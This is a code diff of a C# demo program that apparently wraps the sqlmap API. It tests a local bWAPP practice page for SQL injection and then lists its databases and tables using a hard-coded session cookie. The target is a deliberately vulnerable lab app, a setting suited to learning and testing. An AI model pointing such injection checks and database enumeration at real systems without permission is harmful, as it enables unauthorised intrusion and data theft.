@@ -9,6 +9,7 @@ namespace SqlMapAPIWrapper
     {
         static async Task Main(string[] args)
         {
+            #region postdata
             string data = @"POST /sqli_6.php HTTP/1.1
 Host: localhost
 Content-Length: 24
@@ -70,17 +71,35 @@ Connection: close
 
 {""Username"":""test"",""Password"":""test""}";
 
+            #endregion
 
-
+            string targetUrl = "http://localhost/sqli_1.php?title=test";
+            string targetUrlNotWorking = "http://localhost/sqli_1.php";
+            string sessionCookie = "security_level=0; PHPSESSID=51nj4pcfoc9pqv8tju5bmdrv31";
+            string db = "bWAPP";
+            string table = "movies";
+            
             SqlMapApiWrapper wrapper = new SqlMapApiWrapper("127.0.0.1", 8775);
-            bool inject =await  wrapper.IsSqlinjectable("localhost/sqli_1.php?title=test","security_level=0; PHPSESSID=gj4a6vjrbpqc3imapg492b7el0");
-            /*
-string targetUrl = "http://localhost/sqli_1.php?title=test";
-string targetUrlNotWorking = "http://localhost/sqli_1.php";
-string sessionCookie = "security_level=0; PHPSESSID=5pdj4a7fk5vj1amju59piiht51";
-string db = "bWAPP";
-string table = "users";
+            bool inject = await  wrapper.IsSqlinjectable(targetUrl,sessionCookie);
+            var dbs = await wrapper.GetDatabases(targetUrl, sessionCookie);
+            var tables = await wrapper.GetDatabaseTables(targetUrl, sessionCookie, db);
+            
+            Console.WriteLine($"Database is injectable: {inject}\n");
+            
+            Console.WriteLine($"Found Databases: ");
+            foreach (var database in dbs)
+            {
+                Console.WriteLine($"\t {database}");
+            }
+            
+            Console.WriteLine($"\nFound Tables: ");
+            foreach (var dbTable in tables)
+            {
+                Console.WriteLine($"\t {dbTable}");
+            }
 
+
+            /*
 //One Task at a time otherwise bWAPP gets DOSed
 var injectable =  await wrapper.IsSqlinjectable(targetUrl, sessionCookie);
 var injectable2 = await wrapper.IsSqlinjectable(data);
